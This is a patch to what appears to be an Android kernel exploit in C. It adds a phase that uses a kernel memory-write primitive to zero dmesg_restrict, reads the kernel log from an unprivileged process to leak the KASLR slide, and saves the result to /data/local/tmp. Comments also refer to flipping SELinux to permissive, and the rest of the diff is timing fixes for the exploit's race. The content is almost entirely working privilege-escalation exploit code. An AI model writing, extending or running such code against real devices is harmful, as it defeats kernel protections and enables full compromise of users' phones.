@@ -533,6 +533,20 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                        (unsigned long long)stack_lock);
               live_sync_log("SS", st);
             }
+          } else if (ph == 8) {
+            /*
+             * dmesg_restrict = 0 via PLAIN-STORE (AVC-neutral — unlike the
+             * selinux permissive flip which kills the box mid-walk).
+             * Value = P0(phys 4GB) = 0xffffff8100000000: low32 = 0 zeroes
+             * the int; parent = value&~3 = physmap of phys-0x100000000
+             * (inside the 12GB RAM — mapped; the change_child's 8-byte
+             * write lands in live RAM, one qword in 12GB). dmesg then
+             * exposes the boot "Virtual kernel memory layout" print whose
+             * .text line is a RAW address (not %p — unmaskable) = slide.
+             */
+            tree_pc = 0xffffff8100000000ULL;
+            tree_r = 0;
+            tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x029C9D20ULL);
           } else if (ph == 7) {
             /* ISOLATION TEST: bootid target (ph3 = walk-completing) with
              * the ph1 VALUE (P0 0x02AB0000). Completing walk -> the
@@ -1969,6 +1983,8 @@ int selfstamp_prestage(void) {
   return 0;
 }
 
+#define SYS_syslog 116
+
 static void ss_flow(const char *m) {
   if (!env_flag("QEMU_INIT", 0))
     return;
@@ -1993,7 +2009,7 @@ void selfstamp_route(void) {
   /* SELFSTAMP_SINGLE=N: run ONLY phase N this fire (one walk per boot —
    * multi-phase interference crashes phase 2's stamp window). The next
    * fire on the SAME boot creates a fresh dangling for the next phase. */
-  int single = env_int_range("SELFSTAMP_SINGLE", 0, 0, 7);
+  int single = env_int_range("SELFSTAMP_SINGLE", 0, 0, 8);
   int ph_start = single ? single : 1;
   int ph_end = single ? single : max_ph;
   struct timeval tv0 = {0, 0};
@@ -2081,7 +2097,12 @@ void selfstamp_route(void) {
       clock_gettime(CLOCK_MONOTONIC, &tq0);
       for (;;) {
         select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &tv0);
-        if (atomic_load(&consumer_calls) >= 1)
+        /* WAIT FOR THE WALK TO RETURN: consumer_success is set only AFTER
+         * sched_setattr completes. Exiting at consumer_calls (set before
+         * the call) stopped the stamp mid-walk; the waiter's subsequent
+         * harvester/file syscalls then clobbered the fdset region while
+         * the walk still read it — the mid-walk crash class. */
+        if (atomic_load(&consumer_success) >= 1)
           break;
 
         struct timespec tqn;
@@ -2153,6 +2174,33 @@ void selfstamp_route(void) {
         char lm[64];
         snprintf(lm, sizeof(lm), "PERMISSIVE_LANDED rep=%d", landed_src);
         live_sync_log("SS", lm);
+      }
+      /*
+       * ph8 path: klogctl (SYS_syslog action 3 = read_all) — works for
+       * unprivileged tasks iff dmesg_restrict==0. Loop-retry like kallsyms;
+       * on success dump the ring (contains the boot memory-layout print
+       * with RAW .text) to a persistent file — the slide harvest.
+       */
+      {
+        int got_dmesg = 0;
+        static char dbuf[65536];
+        for (int rep = 0; rep < 250 && !got_dmesg; rep++) {
+          errno = 0;
+          long n = syscall(SYS_syslog, 3, dbuf, sizeof(dbuf) - 1);
+          if (n > 0) {
+            dbuf[n < (long)sizeof(dbuf) - 1 ? n : (long)sizeof(dbuf) - 1] = 0;
+            got_dmesg = 1;
+            int df = open("/data/local/tmp/dmesg_readback",
+                          O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
+            if (df >= 0) {
+              (void)write(df, dbuf, (size_t)n);
+              close(df);
+            }
+            live_sync_log("SS", "DMESG_LANDED");
+            break;
+          }
+          usleep(10000);
+        }
       }
       for (size_t si = 0; si < 2 && landed_src >= 0; si++) {
         int in = open(srcs[si], O_RDONLY | O_CLOEXEC);
